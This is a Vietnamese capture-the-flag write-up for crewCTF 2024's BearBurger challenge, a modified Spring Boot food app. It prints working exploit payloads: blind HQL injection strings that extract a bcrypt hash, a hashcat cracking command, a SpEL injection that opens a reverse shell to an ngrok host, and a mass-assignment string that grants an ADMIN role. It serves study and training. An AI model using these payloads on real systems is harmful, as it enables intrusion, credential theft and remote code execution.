---
title: crewCTF2024 - BearBurger
categories: 
    - CTF
slug: crewctf-2024
date: 2024-08-05 09:47:56+0000
image: cover.png

---

# Preface
Challenge này mình ngồi làm từ đầu giải đến cuối giải nhưng đã không kịp solve, vì cay cú nên mình sẽ viết write up để lưu lại kiến thức mình học được thông qua challenge này.
Bearburger là challenge mà tác giả custom lại code project Bear Burger Spring Boot tại [github](https://github.com/Raofin/BearBurger/). Các chức năng như make admin, remove admin đã bị xóa bỏ, mình có thể nói là 1 phiên bản tối giản và "có thể khai thác hơn" từ version trên github
# Source code analysis
Author tuy đưa cả file war nhưng lại không cho file database, nên mình phải đi tìm file sql của src github để nhét vào, và lưu ý khi lấy từ trên đó về mình sẽ cần phải khai báo username là kiểu varchar(300) cho hợp lý với khai báo thuộc tính đó trong model User:
```java 
@Column(
    name = "Username"
)
    private @NotNull @Size(
    min = 4,
    max = 300
) String username;
```
## SQL Injection in Order By Clause
Thoạt đầu mình nhìn thì cũng spot được ngay chỗ khai thác SQL Injection tại endpoint: `/api/v1/fetch-foods-by-category/{category}/{sorting}`
```java! 

@RequestMapping({"/api/v1"})
public class FoodController {
    ...
    @GetMapping({"/fetch-foods-by-category/{category}/{sorting}"})
    List<Food> fetchFoodsByCategory(@PathVariable String category, @PathVariable String sorting) {
        return this.foodService.findByCategory(category, sorting);
    }
    ...
}
```
API này gọi đến method `findByCategory` nằm tại `/service/FoodServiceImpl.class`
```java!
public List<Food> findByCategory(String category, String sorting) {
    String jpqlQuery = "SELECT f FROM Food f WHERE f.category = :category ORDER BY " + sorting + " DESC";
    return this.entityManager.createQuery(jpqlQuery, Food.class).setParameter("category", category).getResultList();
}
```
Cộng chuỗi như thế kia thì sure kèo là dính SQL Injection rồi =))), nhưng việc inject vào HQL với DBMS đằng sau là MySQL mình thấy khá khó khăn, khi việc HQL xử lý giới hạn số bảng, nó chỉ có thể select được giá trị từ những bảng nằm trong các thực thể đã được map và khai báo, nên ta cũng không đụng được đến được infomation_schema hay gì cả, chỉ có thể dump data trong các bảng hiện tại thôi.
Lúc này mình nghĩ trong đầu là lên được admin bằng cách nào, trong khi password được mã hóa Bcrypt cơ chứ :)), chả nhẽ crack đến chết. Thật bất ngờ intended là crack password thật (mình mất phần lớn thời gian của 2 ngày để tìm cách thực hiện câu lệnh update hay insert nhưng thất bại).
Thôi không dài dòng, mình tiến hành craft payload extract data boolean based như sau:
```!
extractvalue(null,concat('~',(select password from User u where u.username = 'admin'),'~'))
```
Nếu như request select thành công, sẽ trả về lỗi không thể lấy resultSet vì payload trigger lỗi error based:
![image](https://hackmd.io/_uploads/By587p6tA.png)
![image](https://hackmd.io/_uploads/S1jOm6atA.png)
Còn nếu như câu query sai, thì server sẽ không trigger error based nên sẽ hiển thị được thông tin bình thường:
![image](https://hackmd.io/_uploads/BJrC7p6K0.png)
Vậy là payload của mình work, nhưng kết quả thì không được trả ra, nên giờ mình sẽ craft để extract password bằng cách blind thôi
```!
extractvalue(null,concat('~',(select password from User u where u.username = 'admin' and binary(substr(u.password,1,1)) = '$'),'~'))
```
Vì mình biết mật khẩu được hash theo kiểu Bcrypt nên đoạn ký tự đầu lúc nào cũng kiểu `$2a$10`, thử kí tự đầu là $ thì payload đã trả về lỗi (đúng như dự đoán):
![image](https://hackmd.io/_uploads/rJ7jV6ptR.png)
Tốt rồi, đưa vào intruder thôi, Bcrypt hash ra độ dài cố định là 60.
![image](https://hackmd.io/_uploads/Bkk18pTtA.png)
Mình có được kết quả hash admin local là: `$2a$10$3l0p7n2pIIykRYaPsPbvt.8y60kvynF9E7Q6e21sMi7tBRPqL8zvS`, hashcat mình có được pass local là admin =)), yếu thật
Vác payload sang challenge thật, mình có hash dump được là: `$2a$10$vFWElvoCouv8LuyTzOCT8eMq4KSvvbxEPpwRdXcJvDkSmVUbmooTW`
Nhét hash vào file hash-2, chạy hashcat attack mode 3200 theo https://hashcat.net/wiki/doku.php?id=example_hashes
```
hashcat -m 3200 -a 0 hash-2 /usr/share/wordlists/rockyou.txt --force
```
![image](https://hackmd.io/_uploads/HylE366FR.png)
Mình có mật khẩu admin tại web challenge là `adidas`, quá yếu =)))
## SpEL Injection in fetchAllUser
Leo lên được admin, mình diff code với project có trên github thì thấy đoạn code fetchAllUser dính lỗi parseExpression tên của user, chức năng này nằm tại api /api/v1/admin vốn chỉ được truy cập khi người dùng có role ADMIN:
```java!
@RequestMapping({"/api/v1/admin"})
public class UserController {
    ...
    @GetMapping({"/fetch-all-users"})
    List<User> fetchUsersByUsers() {
        return this.userService.fetchAllUsers();
    }
    ...
}

@Transactional(
    readOnly = true
)
public List<User> fetchAllUsers() {
    List<User> result = this.userRepository.findAll();
    ExpressionParser userParser = new SpelExpressionParser();
    Iterator var3 = result.iterator();

    while(var3.hasNext()) {
        User user = (User)var3.next();

        try {
            Expression expression = userParser.parseExpression(user.getUsername());
            String var6 = (String)expression.getValue(String.class);
        } catch (Exception var7) {
        }
    }

    return result;
}
```
Giờ mình đã hiểu lí do tại sao lại kéo username lên 300 kí tự khi ban đầu có 15 kí tự thôi =))
Giờ mình sẽ register payload reverse shell xem sao, payload reverse shell mình tham khảo từ https://github.com/welk1n/ReverseShell-Java:
```!
T(java.lang.Runtime).getRuntime().exec('bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/14482 0>&1')
```
Chèn payload vào username, mình bắt intercept cho tiện:
![image](https://hackmd.io/_uploads/H1vkkCTtC.png)
Gửi request và mình rev shell thành công:
![image](https://hackmd.io/_uploads/S15-yA6Y0.png)
Sau đó là khoảng thời gian mình đi tìm flag =)), tìm ở các file enciron hay hệ thống không có, mình tìm cả ở db nhưng cũng không có:
![image](https://hackmd.io/_uploads/By9o7CTFC.png)
Mình ngố quá, không nhận ra là flag nằm ngay tại thư mục chứa file war mà cứ đi tìm =)) (mình không để ý tên file)
![image](https://hackmd.io/_uploads/SkxIX0aFA.png)
**Flag:** crew{BearBurger_is_on_sale!_LINZ_IS_HERE}

## Another Workaround to Admin
Khi mình đi hỏi những người đã solve được challenge thì nhận được cách khác với cách intended của tác giả, đó là khai thác mass assignment vào register để tạo thêm 1 role nữa cho mình.
Đoạn code xử lý của chức năng register khá đơn giản, nó chỉ hash mật khẩu trước khi lưu vào bảng user, và lưu 1 hàng mang luôn giá trị CUSTOMER vào bảng roles:
```java!
public void registerUser(User user) {
    user.setPassword(this.passwordEncoder.encode(user.getPassword()));
    this.userRepository.save(user);
    this.roleRepository.save(new Role(user.getUserID()));
}

....
    
public Role(int userID) {
    this.userID = userID;
    this.name = "CUSTOMER";
}
```
Lúc này, mình sẽ có thể truyền vào 1 hàng mới user của mình bằng cách sau:
```
roles[0].roleID.=1&roles[0].userID=1&roles[0].name=ADMIN
```
![image](https://hackmd.io/_uploads/rJ62OlAKC.png)
Trong db ta có người dùng đó với userID 18:
![image](https://hackmd.io/_uploads/SJX3OxAFC.png)
Tại bảng roles thì ta có 2 hàng để chứa role của user kev1n-3 là CUSTOMER và ADMIN:
![image](https://hackmd.io/_uploads/BkUeKlRt0.png)
Số của roleID và userID truyền vào không quan trọng, mình có thể truyền gì cũng được nhưng bắt buộc cần truyền giá trị vào, vì 2 biến này sẽ được gen ra tương ứng trong bảng khi khởi tạo user và khởi tạo đối tượng Role bằng userID. Theo như mình hiểu là sau khi nó save đối tượng user thì row role ADMIN sẽ được save, sau đó role CUSTOMER được save sau đó tại câu lệnh bên dưới.